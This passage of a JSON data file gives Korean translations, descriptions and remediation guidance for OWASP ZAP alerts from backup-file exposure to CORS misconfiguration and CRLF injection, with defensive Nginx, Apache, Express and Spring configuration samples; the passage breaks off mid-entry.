      "**자격 증명 로깅 금지:** 사용자 이름, 비밀번호 등 민감한 자격 증명은 서버 로그에 기록하지 않습니다."
    ],
    "example_security_headers": "# Nginx 설정 (HTTPS 강제 및 HSTS)\nserver {\n    listen 80;\n    server_name yourdomain.com;\n    return 301 https://$host$request_uri;\n}\n\nserver {\n    listen 443 ssl;\n    server_name yourdomain.com;\n\n    ssl_certificate /etc/nginx/ssl/yourdomain.crt;\n    ssl_certificate_key /etc/nginx/ssl/yourdomain.key;\n\n    # HSTS 설정 (Max-Age를 충분히 길게 설정하고, includeSubDomains를 포함하는 것이 좋습니다)\n    add_header Strict-Transport-Security \"max-age=31536000; includeSubDomains; preload\" always;\n\n    # ... 다른 설정\n}\n\n# Apache 설정 (HTTPS 강제 및 HSTS)\n<VirtualHost *:80>\n    ServerName yourdomain.com\n    Redirect permanent / https://yourdomain.com/\n</VirtualHost>\n\n<IfModule mod_ssl.c>\n<VirtualHost *:443>\n    ServerName yourdomain.com\n    SSLEngine on\n    SSLCertificateFile /etc/ssl/certs/yourdomain.crt\n    SSLCertificateKeyFile /etc/ssl/private/yourdomain.key\n\n    # HSTS 설정\n    Header always set Strict-Transport-Security \"max-age=31536000; includeSubDomains; preload\"\n\n    # ... 다른 설정\n</VirtualHost>\n</IfModule>"
  },
  "Authentication Request Identified": {
    "translated": "인증 요청 식별 – 로그인, 회원가입 등 인증 관련 통신이 감지됨",
    "description": "애플리케이션 내에서 인증 관련 요청(로그인, 비밀번호 변경, 회원 가입 등)이 식별되었음을 나타냅니다. 이는 취약점 그 자체라기보다는 ZAP이 해당 부분에 대한 추가적인 보안 검토의 필요성을 알리는 정보성 경고일 가능성이 높습니다. 이러한 요청은 잠재적인 무차별 대입 공격, 자격 증명 열거, 세션 고정 등의 대상이 될 수 있습니다.",
    "solution_guidelines": [
      "**강력한 비밀번호 정책 적용:** 사용자에게 길고 복잡한 비밀번호를 사용하도록 강제하고, 주기적인 변경을 유도합니다.",
      "**다단계 인증 (MFA) 도입:** 보안을 강화하기 위해 OTP, SMS 인증 등 다단계 인증을 활성화합니다.",
      "**계정 잠금 및 속도 제한:** 일정 횟수 이상 로그인 실패 시 계정을 잠그거나, 로그인 시도에 대한 속도 제한을 적용하여 무차별 대입 공격을 방지합니다.",
      "**캡차(CAPTCHA) 또는 reCAPTCHA 사용:** 자동화된 봇에 의한 로그인 시도를 방지하기 위해 로그인 페이지에 캡차를 적용합니다.",
      "**일반적인 오류 메시지:** 로그인 실패 시 '사용자 이름 또는 비밀번호가 잘못되었습니다'와 같이 일반적인 오류 메시지를 제공하여 사용자 이름 열거(username enumeration)를 어렵게 합니다.",
      "**HTTPS 사용 강제화:** 모든 인증 관련 통신은 반드시 HTTPS를 통해서만 이루어져야 합니다."
    ]
  },
  "Backup File Detected": {
    "translated": "백업 파일 감지 – 웹 서버에 백업 파일이 남아있는 것이 확인됨",
    "description": "웹 서버나 애플리케이션 디렉토리 내에서 잠재적으로 민감한 정보(소스 코드, 설정 파일, 데이터베이스 백업 등)를 포함할 수 있는 백업 파일(예: `.bak`, `.zip`, `.tar.gz`, `.old`, `~`로 끝나는 파일)이 탐지되었습니다. 이 파일들이 웹을 통해 접근 가능하다면 정보 유출로 이어질 수 있습니다.",
    "solution_guidelines": [
      "**불필요한 백업 파일 제거:** 웹 서버에 배포된 애플리케이션 디렉토리에서 불필요한 백업 파일이나 임시 파일을 모두 제거합니다.",
      "**웹 접근 차단:** 백업 파일이나 설정 파일이 저장되는 디렉토리에 대한 웹 서버 접근을 명시적으로 차단합니다. (예: Apache의 `FilesMatch`, Nginx의 `location` 지시어)",
      "**백업 파일은 웹 루트 외부에 저장:** 백업 파일은 웹 서버의 루트 디렉토리(Document Root) 밖에, 즉 웹에서 직접 접근할 수 없는 안전한 위치에 저장합니다.",
      "**파일 및 디렉토리 권한 설정:** 웹 서버 프로세스가 백업 파일에 접근할 수 없도록 파일 시스템 권한을 최소한으로 설정합니다."
    ],
    "example_nginx": "# Nginx 설정 예시\nlocation ~* \\.(bak|zip|tar\\.gz|old|orig|tmp|conf|log|sql|swp)$ {\n    deny all;\n}",
    "example_apache": "# Apache .htaccess 예시\n<FilesMatch \"\\.(bak|zip|tar\\.gz|old|orig|tmp|conf|log|sql|swp)$\">\n    Order allow,deny\n    Deny from all\n</FilesMatch>"
  },
  "Backup File Disclosure": {
    "translated": "백업 파일 노출 – 백업 파일에 접근 가능하여 내부 정보가 유출될 수 있음",
    "description": "웹 서버 내에 저장된 백업 파일이 웹을 통해 직접 접근 가능하여, 해당 파일에 포함된 민감한 정보(소스 코드, 설정 파일, 데이터베이스 자격 증명, 사용자 데이터 등)가 외부에 노출되는 취약점입니다.",
    "solution_guidelines": [
      "**모든 백업 파일 제거:** 웹 서버의 공개 디렉토리에서 발견된 모든 백업 파일을 즉시 삭제합니다.",
      "**정기적인 웹 서버 및 애플리케이션 디렉토리 검토:** 웹 서버에 배포된 파일 중 불필요하거나 민감한 파일이 웹을 통해 접근 가능한지 정기적으로 확인합니다.",
      "**웹 서버 설정 강화:** `.bak`, `.zip`, `.tar.gz`, `.sql` 등 백업 파일 확장자에 대한 직접적인 웹 접근을 웹 서버 설정에서 영구적으로 차단합니다.",
      "**안전한 백업 전략 수립:** 백업 파일은 웹 서버의 Document Root 외부에 저장하거나, 외부 스토리지(예: S3 버킷)에 안전하게 암호화하여 저장합니다. 백업이 필요한 경우, 다운로드 링크는 한 번만 사용 가능하거나, 인증된 사용자만 접근할 수 있도록 하는 등의 보안 조치를 적용합니다."
    ],
    "example_nginx": "# Nginx 설정 (웹 루트 전체에서 특정 확장자 파일에 대한 접근 차단)\nlocation ~* \\.(bak|zip|tar\\.gz|old|orig|tmp|conf|log|sql|swp)$ {\n    deny all;\n    # return 404; # 403 대신 404를 반환하여 파일 존재 여부 추측 어렵게 할 수 있음\n}",
    "example_apache": "# Apache 설정 (웹 루트 전체에서 특정 확장자 파일에 대한 접근 차단)\n<FilesMatch \"\\.(bak|zip|tar\\.gz|old|orig|tmp|conf|log|sql|swp)$\">\n    Order allow,deny\n    Deny from all\n</FilesMatch>"
  },
  "Base64 Disclosure": {
    "translated": "Base64 인코딩 정보 노출 – Base64로 인코딩된 문자열에 민감 정보가 포함될 수 있음",
    "description": "Base64로 인코딩된 문자열이 웹 페이지 소스 코드, 응답 헤더, 또는 스크립트에 포함되어 전송될 때, 이 문자열이 실제로는 민감한 정보(예: 사용자 이름, 비밀번호, API 키, 세션 토큰)를 담고 있어 Base64 디코딩만으로 정보가 노출되는 취약점입니다. Base64는 암호화가 아니므로 보안 목적으로 사용되어서는 안 됩니다.",
    "solution_guidelines": [
      "**민감 정보 Base64 인코딩 금지:** 자격 증명, 개인 식별 정보(PII), API 키, 세션 토큰 등 민감한 데이터는 Base64로 인코딩하여 클라이언트에 전송하거나 저장해서는 안 됩니다.",
      "**민감 정보는 암호화하여 전송:** 민감한 정보는 반드시 강력한 암호화 알고리즘(예: AES)을 사용하여 암호화한 후 전송해야 합니다. 가능하다면 서버 측에서만 처리하고 클라이언트에 전송하지 않는 것이 가장 좋습니다.",
      "**JWT(JSON Web Token) 사용 시 주의:** JWT의 페이로드는 Base64로 인코딩되므로, 민감 정보는 JWT의 페이로드에 직접 포함되어서는 안 됩니다. 서명되거나 암호화된 JWT를 사용하고, 민감 정보는 서버 측에서 세션 또는 데이터베이스를 통해 관리합니다.",
      "**클라이언트 측 로직 검토:** JavaScript 코드나 HTML 속성 내에 Base64로 인코딩된 민감 정보가 하드코딩되거나 동적으로 주입되지 않도록 코드를 검토합니다."
    ],
    "example_avoidance": "// 잘못된 예시 (민감 정보 Base64 인코딩)\n// const apiKey = btoa('mysecretapikey'); // 절대 이렇게 사용해서는 안 됩니다.\n// document.getElementById('api_key_field').value = apiKey;\n\n// 올바른 예시: 민감 정보는 서버 측에서만 관리하거나 안전하게 암호화하여 전송합니다.\n// API 호출은 서버 측에서 프록시하거나, 인증 토큰을 사용하여 안전하게 처리합니다.\n\n// JWT 사용 시 페이로드에 민감 정보 포함 금지\n// {\n//   \"sub\": \"1234567890\",\n//   \"name\": \"John Doe\",\n//   \"admin\": true,\n//   // \"private_key\": \"...\" // 절대 포함해서는 안 됨\n// }"
  },
  "Base64 Disclosure in WebSocket message": {
    "translated": "웹소켓 메시지 내 Base64 정보 노출 – 웹소켓 통신 중 Base64 인코딩된 민감 정보가 유출될 수 있음",
    "description": "웹소켓 메시지 내에 Base64로 인코딩된 민감한 정보(예: 사용자 자격 증명, 세션 ID, 개인 식별 정보)가 포함되어 전송되는 취약점입니다. 웹소켓은 일반적으로 암호화된 채널(WSS)을 사용하지만, Base64 인코딩은 암호화가 아니므로 메시지가 도청될 경우 쉽게 디코딩되어 정보가 노출됩니다.",
    "solution_guidelines": [
      "**웹소켓 메시지에 민감 정보 직접 포함 금지:** 웹소켓 메시지 페이로드에 사용자 이름, 비밀번호, API 키, 세션 토큰, PII 등 민감한 데이터를 Base64 인코딩하여 직접 포함하지 않습니다.",
      "**종단 간 암호화 (End-to-End Encryption) 또는 메시지 암호화 고려:** 가능하다면 웹소켓을 통해 전송되는 민감 데이터는 애플리케이션 계층에서 추가적인 암호화(예: AES)를 적용하여 전송합니다. 하지만 대부분의 경우 WSS(WebSocket Secure)를 통한 전송만으로도 충분합니다.",
      "**WSS(WebSocket Secure) 사용 강제화:** 모든 웹소켓 통신은 반드시 TLS/SSL을 사용하는 `wss://` 프로토콜을 통해서만 이루어져야 합니다. HTTP로의 웹소켓 연결(ws://)은 평문 통신이므로 절대 사용해서는 안 됩니다.",
      "**토큰 기반 인증:** 웹소켓 세션 인증에는 짧은 수명을 가진 인증 토큰(예: JWT)을 사용하고, 이 토큰도 민감 정보를 페이로드에 직접 포함하지 않도록 주의합니다.",
      "**세션 ID 대신 임시 토큰 사용:** 웹소켓 연결 시 초기 인증을 위해 세션 ID를 직접 사용하는 대신, 일회성 또는 짧은 수명을 가진 임시 토큰을 발급하여 사용하는 것을 고려합니다.",
      "**서버 측 로깅에서 민감 정보 제외:** 웹소켓 메시지 로그를 기록할 때 민감한 데이터는 마스킹하거나 기록하지 않도록 설정합니다."
    ],
    "example_avoidance": "// 잘못된 예시 (Base64로 인코딩된 민감 정보 전송)\n// const sensitiveData = { username: 'testuser', password: 'password123!' };\n// ws.send(btoa(JSON.stringify(sensitiveData))); // 절대 이렇게 사용해서는 안 됩니다.\n\n// 올바른 예시:\n// 웹소켓을 통한 인증은 초기 핸드셰이크 시 토큰(JWT 등)을 사용하거나,\n// 세션 쿠키를 통해 처리되어야 합니다.\n// 메시지 내용은 민감 정보가 아니거나, WSS로 충분히 보호됩니다.\n\n// 클라이언트 (JavaScript)\n// const ws = new WebSocket('wss://yourdomain.com/ws'); // WSS 사용\n// ws.onopen = () => {\n//     console.log('WebSocket connected');\n//     // 초기 인증 토큰 전송 (이미 로그인된 세션 기반)\n//     // ws.send(JSON.stringify({ type: 'AUTH', token: 'your_jwt_token' }));\n// };\n// ws.onmessage = event => {\n//     console.log('Received:', event.data);\n// };\n// ws.onerror = error => {\n//     console.error('WebSocket Error:', error);\n// };\n\n// 서버 (Node.js with ws)\n// wss.on('connection', ws => {\n//     ws.on('message', message => {\n//         // ... 메시지 처리 로직\n//         // 만약 메시지 내에 민감 정보가 필요하다면,\n//         // 이를 암호화하거나, 세션 ID를 통해 서버에서 조회하는 방식으로 처리합니다.\n//         // 절대로 Base64 인코딩만으로 민감 정보를 전송하지 않습니다.\n//         ws.send(JSON.stringify({ status: 'success', data: 'some_data' }));\n//     });\n// });"
  },
  "Big Redirect Detected (Potential Sensitive Information Leak)": {
    "translated": "대규모 리다이렉션 감지 (잠재적 민감 정보 유출) – 리다이렉션 과정에서 URL에 민감 정보가 노출될 수 있음",
    "description": "HTTP 리다이렉트 응답(3xx 상태 코드)에서 리다이렉트되는 URL에 지나치게 많은 데이터(예: 쿼리 파라미터, 경로)가 포함되어 있거나, 민감한 정보가 포함되어 있을 가능성이 있는 취약점입니다. 이는 URL이 브라우저 히스토리, 웹 서버 로그, 리퍼러 헤더 등에 기록되어 정보 유출로 이어질 수 있습니다.",
    "solution_guidelines": [
      "**리다이렉트 URL에 민감 정보 포함 금지:** 리다이렉트되는 URL의 쿼리 파라미터나 경로에 세션 ID, 비밀번호, 개인 식별 정보(PII) 등 민감한 정보를 포함하지 않습니다.",
      "**리다이렉트 시 데이터 전송 최소화:** 리다이렉트가 필요한 경우, URL에 전달되는 데이터의 양을 최소화합니다. 복잡한 상태나 대량의 데이터는 세션, 쿠키(Secure 및 HttpOnly 플래그 설정), 또는 POST 요청을 통해 서버 측에서 처리하도록 합니다.",
      "**POST 요청 후 리다이렉트(Post/Redirect/Get - PRG 패턴) 사용:** 폼 제출과 같은 POST 요청 후에 리다이렉트를 사용하여 브라우저 히스토리에 폼 데이터가 남지 않도록 합니다.",
      "**Referer 헤더 주의:** 리다이렉트 시 이전 URL이 Referer 헤더에 포함될 수 있으므로, 민감한 정보가 포함된 URL에서 다른 사이트로 리다이렉트하는 경우 Referer 헤더를 주의해야 합니다. `Referrer-Policy` 헤더를 설정하여 제어할 수 있습니다."
    ],
    "example_avoidance": "// 잘못된 예시 (URL에 민감 정보 포함)\n// Response.Redirect(\"https://example.com/success?sessionid=ABCDEFG12345&username=user123\");\n\n// 올바른 예시\n// Response.Redirect(\"https://example.com/success\");\n// 세션 ID는 Secure 및 HttpOnly 플래그가 설정된 쿠키를 통해 관리\n// 사용자 이름 등은 서버 측 세션을 통해 관리\n\n// Referrer-Policy 헤더 설정 예시 (HTML meta 태그 또는 HTTP 헤더)\n// <meta name=\"referrer\" content=\"no-referrer\">\n// 또는\n// Header set Referrer-Policy \"no-referrer\"\n\n// Spring Framework RedirectAttributes 예시 (데이터를 URL에 노출하지 않고 리다이렉트)\n// @Controller\n// public class MyController {\n//     @PostMapping(\"/submit\")\n//     public String handleSubmit(@RequestParam String data, RedirectAttributes redirectAttributes) {\n//         redirectAttributes.addFlashAttribute(\"message\", \"Data processed successfully!\");\n//         return \"redirect:/success\";\n//     }\n//\n//     @GetMapping(\"/success\")\n//     public String showSuccess(Model model) {\n//         // \"message\"는 Flash 속성으로 한 번만 사용 가능하고 URL에 노출되지 않습니다.\n//         return \"success\";\n//     }\n// }"
  },
  "Buffer Overflow": {
    "translated": "버퍼 오버플로우 – 프로그램 메모리 과부하로 인해 오작동 및 코드 실행이 발생할 수 있음",
    "description": "프로그램이 데이터를 버퍼에 쓸 때, 할당된 버퍼 크기를 초과하여 데이터를 쓰는 경우 발생하는 취약점입니다. 이는 인접한 메모리 영역을 덮어써서 프로그램 충돌, 데이터 손상, 또는 임의 코드 실행으로 이어질 수 있습니다. 웹 애플리케이션에서는 주로 사용자 입력(URL, 헤더, 폼 데이터)이 서버 측 코드에서 제대로 검증되지 않을 때 발생할 수 있습니다.",
    "solution_guidelines": [
      "**안전한 프로그래밍 언어 및 라이브러리 사용:** C/C++과 같은 메모리 직접 접근이 가능한 언어에서는 버퍼 오버플로우에 특히 취약하므로, 안전한 문자열 및 메모리 관리 함수(예: `strncpy_s`, `snprintf`, `std::string` in C++)를 사용합니다. Java, Python, C# 등 메모리 안전성이 내장된 언어를 사용하는 것이 좋습니다.",
      "**입력값 길이 제한 및 검증:** 사용자로부터 받는 모든 입력(URL, 헤더, 폼 필드, 파일 업로드 등)의 길이를 서버 측에서 엄격하게 검증하고, 할당된 버퍼 크기를 초과하지 않도록 합니다.",
      "**경계 검사 (Bounds Checking):** 배열이나 버퍼에 접근하기 전에 항상 인덱스나 길이가 유효한 범위 내에 있는지 확인하는 로직을 포함합니다.",
      "**컴파일러 보안 기능 활용:** 스택 가드(Stack Guard), ASLR(Address Space Layout Randomization), DEP/NX(Data Execution Prevention/No-Execute)와 같은 컴파일러 및 운영 체제의 보안 기능을 활성화하여 버퍼 오버플로우 공격의 성공 가능성을 줄입니다.",
      "**최신 버전의 소프트웨어 사용:** 운영 체제, 웹 서버, 애플리케이션 프레임워크 및 라이브러리를 항상 최신 보안 패치가 적용된 버전으로 유지합니다. 알려진 버퍼 오버플로우 취약점은 업데이트를 통해 해결되는 경우가 많습니다."
    ],
    "example_c_code_mitigation": "// C 언어에서 안전하지 않은 strcpy 사용 예시 (취약)\n// char buffer[10];\n// strcpy(buffer, userInput); // userInput이 10바이트 이상이면 버퍼 오버플로우 발생\n\n// C 언어에서 안전한 strncpy_s 사용 예시 (마이크로소프트 확장)\n// char buffer[10];\n// strncpy_s(buffer, sizeof(buffer), userInput, _TRUNCATE);\n\n// C++ std::string 사용 (안전한 문자열 처리)\n#include <string>\n#include <iostream>\n\nint main() {\n    std::string userInput;\n    std::cout << \"Enter input: \";\n    std::getline(std::cin, userInput);\n\n    std::string buffer;\n    // std::string은 자동으로 크기 조절을 하므로 버퍼 오버플로우 위험이 낮습니다.\n    buffer = userInput;\n    std::cout << \"Buffer content: \" << buffer << std::endl;\n\n    // 만약 특정 길이를 제한해야 한다면:\n    if (userInput.length() > 20) {\n        std::cout << \"Input too long!\" << std::endl;\n        // 적절한 오류 처리 또는 입력값 자르기\n        buffer = userInput.substr(0, 20);\n    } else {\n        buffer = userInput;\n    }\n\n    return 0;\n}"
  },
  "Bypassing 403": {
    "translated": "403 Forbidden 우회 – 접근 금지된 자원에 비정상적으로 접근할 수 있음",
    "description": "웹 서버나 애플리케이션이 특정 리소스에 대한 접근을 '403 Forbidden' 응답으로 차단하고 있지만, 공격자가 다양한 우회 기술(예: HTTP 메소드 변경, URL 인코딩 변형, 비표준 헤더 추가, 경로 트래버설 변형, HTTP 파라미터 오염)을 사용하여 이 접근 제어를 우회하는 데 성공했음을 나타냅니다. 이는 민감 정보 노출, 권한 상승, 기능 오용으로 이어질 수 있습니다.",
    "solution_guidelines": [
      "**긍정 보안 모델 (Whitelist) 적용:** '무엇을 허용할 것인가'를 명시적으로 정의하고, 그 외의 모든 것은 기본적으로 거부하는 방식으로 접근 제어를 구현합니다. '무엇을 금지할 것인가'를 정의하는 부정 보안 모델(Blacklist)은 우회될 가능성이 높습니다.",
      "**서버 측에서 모든 접근 제어 검사:** 클라이언트 측에서 이루어지는 모든 접근 제어는 쉽게 우회될 수 있으므로, 반드시 서버 측에서 모든 자원에 대한 접근 권한을 철저히 검사해야 합니다.",
      "**정규화된 경로 사용:** 사용자 입력으로 구성된 경로를 처리하기 전에 `../`와 같은 경로 탐색 문자를 정규화(canonicalize)하여 예상치 못한 경로에 접근하는 것을 방지합니다.",
      "**모든 HTTP 메소드 검토:** GET, POST뿐만 아니라 PUT, DELETE, OPTIONS, HEAD 등 모든 HTTP 메소드에 대한 접근 제어가 올바르게 적용되었는지 확인합니다.",
      "**HTTP 헤더 검토:** `X-Original-URL`, `X-Rewrite-URL`, `X-Forwarded-For` 등 프록시나 리버스 프록시에서 사용될 수 있는 헤더가 접근 제어 로직에 영향을 미치는지 확인하고 적절히 처리합니다.",
      "**URL 인코딩 및 이중 인코딩 처리:** URL 경로 및 쿼리 파라미터가 다양한 인코딩 방식으로 변조될 수 있으므로, 이를 올바르게 디코딩하고 검증하는 로직을 구현합니다.",
      "**포괄적인 테스트:** 다양한 우회 기법을 사용하여 접근 제어 로직을 철저히 테스트하고, Fuzzing 도구를 사용하여 예상치 못한 입력에 대한 애플리케이션의 반응을 관찰합니다."
    ],
    "example_general_guidance": "# **일반적인 개발 가이드라인:**\n# - **URL 경로 정규화:**\n#   사용자 입력이 포함된 경로를 처리하기 전에, `path/to/resource/../another` 와 같은 경로를\n#   `path/to/another` 로 정규화하는 로직을 서버 측에서 구현합니다.\n#   대부분의 웹 프레임워크는 이러한 정규화를 자동으로 처리하지만, 사용자 정의 로직에서는 주의가 필요합니다.\n\n# - **HTTP 메소드 기반 접근 제어:**\n#   예를 들어, REST API에서 특정 리소스에 대한 GET 요청은 허용하되,\n#   POST/PUT/DELETE 요청은 특정 역할이나 권한을 가진 사용자에게만 허용하도록 명확히 정의합니다.\n\n# - **입력값에 대한 화이트리스트 유효성 검사:**\n#   파일 이름, 경로, ID 등 모든 사용자 입력에 대해 허용되는 문자 집합, 길이, 형식 등을\n#   정의하고 이에 벗어나는 입력은 거부합니다.\n\n# - **WAF (웹 애플리케이션 방화벽) 활용:**\n#   WAF는 이러한 우회 시도를 탐지하고 차단하는 데 도움이 될 수 있지만,\n#   근본적인 해결책은 아니므로 애플리케이션 코드 레벨에서의 방어가 중요합니다."
  },
  "CORS Header": {
    "translated": "CORS(교차 출처 리소스 공유) 헤더 – 다른 도메인과의 리소스 공유 설정이 있는지 확인",
    "description": "CORS (Cross-Origin Resource Sharing) 헤더가 웹 응답에 포함되어 있음을 나타냅니다. 이는 취약점이라기보다는 정보성 알림일 가능성이 높습니다. CORS 헤더는 웹 브라우저가 교차 출처 요청을 수행할 수 있도록 서버가 접근 제어를 지정하는 메커니즘입니다. 그러나 잘못 구성되면 보안 취약점(CORS Misconfiguration)으로 이어질 수 있습니다.",
    "solution_guidelines": [
      "**CORS 필요성 확인:** 교차 출처 리소스 공유가 실제로 필요한지 신중하게 검토합니다. 필요하지 않다면 CORS 헤더를 설정하지 않는 것이 가장 안전합니다.",
      "**허용된 출처(Origin) 명확히 지정:** `Access-Control-Allow-Origin` 헤더에 `'*'` (모든 출처 허용)를 사용하는 것을 피하고, 리소스를 요청할 수 있는 특정 도메인(예: `https://your-frontend.com`)을 명시적으로 지정합니다.",
      "**자격 증명 허용(`Access-Control-Allow-Credentials`) 시 주의:** `Access-Control-Allow-Credentials: true`를 설정할 경우, `Access-Control-Allow-Origin`에 `'*'`를 사용할 수 없습니다. `Access-Control-Allow-Credentials: true`는 쿠키, HTTP 인증 자격 증명, 클라이언트 SSL 인증서와 같은 사용자 자격 증명이 교차 출처 요청에 포함될 수 있도록 허용하므로, 이 설정을 사용하는 경우 `Access-Control-Allow-Origin`을 매우 신중하게 제한해야 합니다.",
      "**허용된 메소드 및 헤더 제한:** `Access-Control-Allow-Methods` 및 `Access-Control-Allow-Headers`를 사용하여 허용되는 HTTP 메소드와 헤더를 필요한 최소한으로 제한합니다.",
      "**사전 요청(Preflight Request) 이해 및 처리:** `OPTIONS` 메소드를 사용하는 사전 요청을 올바르게 처리하도록 서버를 구성합니다."
    ],
    "example_nodejs_express_cors": "// Express.js (Node.js) CORS 설정 예시\nconst express = require('express');\nconst cors = require('cors'); // CORS 미들웨어\n\nconst app = express();\n\n// 1. 모든 출처 허용 (개발 또는 비민감 API에서만 사용, 운영 환경에서는 권장되지 않음)\n// app.use(cors());\n\n// 2. 특정 출처만 허용 (권장)\napp.use(cors({\n    origin: 'https://your-frontend-domain.com', // 특정 도메인 지정\n    methods: ['GET', 'POST', 'PUT', 'DELETE'], // 허용할 메소드\n    allowedHeaders: ['Content-Type', 'Authorization'], // 허용할 요청 헤더\n    credentials: true // 자격 증명 포함 허용 여부 (origin이 '*'일 때는 사용할 수 없음)\n}));\n\n// 여러 출처 허용\n// const allowedOrigins = ['https://your-frontend-domain.com', 'https://another-frontend.com'];\n// app.use(cors({\n//     origin: function (origin, callback) {\n//         if (allowedOrigins.indexOf(origin) !== -1 || !origin) {\n//             callback(null, true);\n//         } else {\n//             callback(new Error('Not allowed by CORS'));\n//         }\n//     },\n//     credentials: true\n// }));\n\n// ... 라우터 및 다른 미들웨어",
    "example_java_spring_cors": "// Spring Framework CORS 설정 예시\n@Configuration\n@EnableWebMvc\npublic class WebConfig implements WebMvcConfigurer {\n\n    @Override\n    public void addCorsMappings(CorsRegistry registry) {\n        registry.addMapping(\"/api/**\") // CORS를 적용할 경로 패턴\n                .allowedOrigins(\"https://your-frontend-domain.com\") // 특정 도메인 허용\n                // .allowedOrigins(\"*\") // 모든 출처 허용 (권장되지 않음)\n                .allowedMethods(\"GET\", \"POST\", \"PUT\", \"DELETE\") // 허용할 HTTP 메소드\n                .allowedHeaders(\"Content-Type\", \"Authorization\") // 허용할 요청 헤더\n                .allowCredentials(true) // 자격 증명(쿠키, HTTP 인증 등) 포함 허용\n                .maxAge(3600); // 사전 요청(preflight) 결과 캐시 시간 (초)\n    }\n}"
  },
  "CORS Misconfiguration": {
    "translated": "CORS 설정 오류 – 다른 도메인에서 비정상적인 접근이 가능할 수 있음",
    "description": "CORS (Cross-Origin Resource Sharing) 설정이 잘못되어 보안 취약점을 유발하는 경우입니다. 예를 들어, `Access-Control-Allow-Origin` 헤더에 너무 광범위한 와일드카드(`*`)를 사용하거나, 사용자 입력값을 그대로 반영하는 등 신뢰할 수 없는 출처에서의 요청을 허용하여 민감 정보 유출, XSS 공격 등 다양한 공격에 노출될 수 있습니다.",
    "solution_guidelines": [
      "**와일드카드(`*`) 사용 금지:** `Access-Control-Allow-Origin` 헤더에 `'*'`를 사용하는 것을 피하고, 애플리케이션에서 실제로 필요한 특정 출처(도메인)만 명시적으로 허용합니다.",
      "**동적 출처 허용 시 주의:** `Access-Control-Allow-Origin` 값을 요청의 `Origin` 헤더에서 가져와 동적으로 설정하는 경우, `Origin` 헤더를 철저히 검증하여 신뢰할 수 있는 도메인만 허용하도록 화이트리스트 기반의 검증 로직을 구현합니다.",
      "**`Access-Control-Allow-Credentials: true` 사용 시 주의:** `Access-Control-Allow-Credentials: true`는 `Access-Control-Allow-Origin`이 `'*'`일 때 사용할 수 없으며, 이를 설정하는 경우 `Access-Control-Allow-Origin`을 특정 도메인으로 엄격하게 제한해야 합니다. 자격 증명(쿠키 등)이 교차 출처 요청에 포함될 수 있기 때문입니다.",
      "**허용된 메소드 및 헤더 제한:** `Access-Control-Allow-Methods` 및 `Access-Control-Allow-Headers`를 필요한 최소한으로 제한하여 불필요한 기능 노출을 막습니다.",
      "**Preflight 요청의 정확한 처리:** `OPTIONS` 메소드를 사용하는 Preflight 요청에 대한 응답이 올바르게 구성되어야 합니다.",
      "**모든 CORS 관련 헤더 검토:** `Access-Control-Allow-Origin`, `Access-Control-Allow-Methods`, `Access-Control-Allow-Headers`, `Access-Control-Allow-Credentials`, `Access-Control-Expose-Headers`, `Access-Control-Max-Age` 등 모든 CORS 관련 헤더 설정을 보안 관점에서 검토합니다."
    ],
    "example_safe_cors_config": "// 잘못된 예시 (CORS Misconfiguration)\n// app.use(cors({ origin: true })); // 요청 Origin을 그대로 반영 (취약)\n// res.setHeader('Access-Control-Allow-Origin', req.headers.origin); // 요청 Origin을 그대로 반영 (취약)\n\n// 올바른 예시 (Node.js/Express.js with cors middleware)\nconst express = require('express');\nconst cors = require('cors');\n\nconst app = express();\n\nconst whitelist = ['https://trusted-frontend.com', 'https://api.trusted-domain.com'];\n\napp.use(cors({\n  origin: function (origin, callback) {\n    // 요청의 Origin이 화이트리스트에 있는지 확인 (또는 Origin이 없는 경우 허용)\n    if (whitelist.indexOf(origin) !== -1 || !origin) {\n      callback(null, true);\n    } else {\n      callback(new Error('Not allowed by CORS'));\n    }\n  },\n  methods: ['GET', 'POST'], // 필요한 메소드만 허용\n  allowedHeaders: ['Content-Type', 'Authorization'], // 필요한 헤더만 허용\n  credentials: true // 자격 증명 허용 여부 (Origin 제한 필수)\n}));\n\n// ... 라우터 등"
  },
  "CRLF Injection": {
    "translated": "CRLF 인젝션 – HTTP 응답 헤더를 조작하여 악용할 수 있음",
    "description": "CRLF (Carriage Return `\\r`, Line Feed `\\n`) 문자가 사용자 입력에 포함되어 HTTP 응답 헤더나 로그 파일 등에 주입될 수 있는 취약점입니다. 공격자는 이를 통해 HTTP 응답 분할(HTTP Response Splitting), 캐시 중독(Cache Poisoning), XSS, HTTP 헤더 주입 등 다양한 공격을 수행할 수 있습니다.",
    "solution_guidelines": [
      "**사용자 입력에서 CRLF 문자 제거 또는 인코딩:** HTTP 헤더, 로그 파일, 파일 이름 등 CRLF 문자가 민감하게 사용될 수 있는 모든 사용자 입력에서 `\\r` (CR) 및 `\\n` (LF) 문자를 제거하거나, URL 인코딩 또는 다른 안전한 방식으로 인코딩하여 처리합니다.",
      "**HTTP 헤더 생성 시 주의:** 사용자 입력이 HTTP 헤더 값으로 사용될 경우, 사용 중인 웹 프레임워크나 언어의 HTTP 헤더 설정 함수가 CRLF 문자를 자동으로 처리(제거 또는 오류 발생)하는지 확인합니다. 수동으로 헤더를 구성할 때는 특히 주의해야 합니다.",
      "**로그 파일 작성 시 주의:** 로그 파일에 사용자 입력을 기록할 때 CRLF 문자를 필터링하거나, 로깅 라이브러리의 보안 기능을 활용하여 로그 파일의 무결성을 유지합니다.",
      "**URL 리다이렉션 시 검증:** `Location` 헤더에 사용자 입력이 포함되는 리다이렉션의 경우, 리다이렉트 URL이 절대 경로이고 예상된 도메인 내에 있는지 철저히 검증합니다."
    ],
    "example_java_prevention": "// Java (Spring Framework) 예시\n// HTTP 응답 헤더에 사용자 입력 사용 시\n// @Controller\n// public class MyController {\n//\n//     @GetMapping(\"/set-header\")\n//     public ResponseEntity<String> setCustomHeader(@RequestParam String value) {\n//         // 사용자 입력에서 CRLF 제거 (가장 안전한 방법)\n//         String safeValue = value.replace(\"\\\\r\", \"\").replace(\"\\\\n\", \"\");\n//\n//         return ResponseEntity.ok()\n//             .header(\"X-Custom-Header\", safeValue) // 안전하게 필터링된 값 사용\n//             .body(\"Header set.\");\n//     }\n//\n//     // 리다이렉션 시 안전한 URL 검증\n//     @GetMapping(\"/redirect\")\n//     public String redirectToUrl(@RequestParam String url) {\n//         // 화이트리스트 기반의 URL 검증 (가장 강력)\n//         if (!url.startsWith(\"https://trusted-domain.com/\")) {\n//             // 허용되지 않는 URL인 경우 기본 페이지로 리다이렉트 또는 오류 반환\n//             return \"redirect:/error\";\n//         }\n//         return \"redirect:\" + url; // 검증된 URL만 리다이렉션\n//     }\n// }\n\n// Node.js (Express.js) 예시\n// app.get('/set-cookie', (req, res) => {\n//     const userInput = 